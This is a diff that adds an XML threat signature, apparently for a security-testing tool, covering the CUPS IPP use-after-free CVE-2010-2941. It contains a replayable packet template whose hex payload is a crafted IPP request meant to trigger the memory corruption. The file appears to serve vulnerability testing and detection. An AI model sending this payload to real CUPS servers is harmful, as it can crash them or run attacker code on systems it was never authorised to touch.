@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apple CUPS IPP Use-after-free Memory Corruption"/>
+    <EngDesc display="true" value="A use-after-free memory corruption vulnerability exists in the implementation of Internet Printing Protocol (IPP) of the Common Unix Printing System (CUPS). This vulnerability is caused by improper handling of memory allocations and deallocations for multiple-valued attributes that have their values typed differently.A remote attacker can exploit this vulnerability by specially crafting a request to a CUPS server using the IPP protocol. Successful exploitation can result in execution of arbitrary code in the security context of the CUPS process or daemon, unsuccessful exploitation may result in a denial of service."/>
+    <Intent display="true">
+      <item value="Memory_Corruption"/>
+    </Intent>
+    <Protocol display="true" value="IPP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple_Computer"/>
+      <item value="Red_Hat"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Mac_OS_X"/>
+      <item value="Red_Hat_Desktop_Linux"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apple_Computer_Common_UNIX_Printing_System_(CUPS)_1.4.4_and_prior"/>
+      <item value="Apple_Computer_Mac_OS_X__Other"/>
+      <item value="Red_Hat_Desktop_Linux__Other"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20101101-03"/>
+    <CVEID display="true" value="CVE-2010-2941"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Jim Liu"/>
+    <ID display="true" value="c7195886158a0d38c26cefa2d604fa05"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634317203079495274"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1296124217" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="IPPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="C"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:D0:68:54" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02C1" Identification="8225" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="5485" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="32881" destPort="$IPPdestPort" SeqNumber="E34C64B7" AckNumber="27DDBB3C" HeaderLength="08" WindowSize="002E" Checksum="9C1B" UrgentPointer="0000" Options="0101080A4A50E696BC1E9808" Payload="504F5354202F20485454502F312E300A436F6E74656E742D747970653A206170706C69636174696F6E2F6970700A4163636570742D4C616E67756167653A20656E0A436F6E74656E742D6C656E6774683A203535320A486F73743A20646863703130360A0A0101000B0000000101380012617474726962757465732D6368617273657400057574662D3847000001004141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414148001B617474726962757465732D6E61747572616C2D6C616E67756167650005656E2D757345000B7072696E7465722D75726900216970703A2F2F6468637038333A3633312F7072696E746572732F7072696E7465724400147265717565737465642D617474726962757465730010636F706965732D737570706F727465644400000011636861727365742D737570706F727465644400000019646F63756D656E742D666F726D61742D737570706F7274656444000000197072696E7465722D69732D616363657074696E672D6A6F6273440000000D7072696E7465722D737461746544000000157072696E7465722D73746174652D726561736F6E7303" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:D0:68:54" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00C8" Identification="2335" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="B56E" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$IPPdestPort" destPort="32881" SeqNumber="27DDBB3C" AckNumber="E34C6744" HeaderLength="08" WindowSize="006F" Checksum="E81F" UrgentPointer="0000" Options="0101080ABC1E980B4A50E696" Payload="485454502F312E3020323030204F4B0D0A446174653A205468752C2030322044656320323031302032303A30363A303820474D540D0A5365727665723A20435550532F312E340D0A436F6E74656E742D4C616E67756167653A20656E0D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6970700D0A436F6E74656E742D4C656E6774683A203132320D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
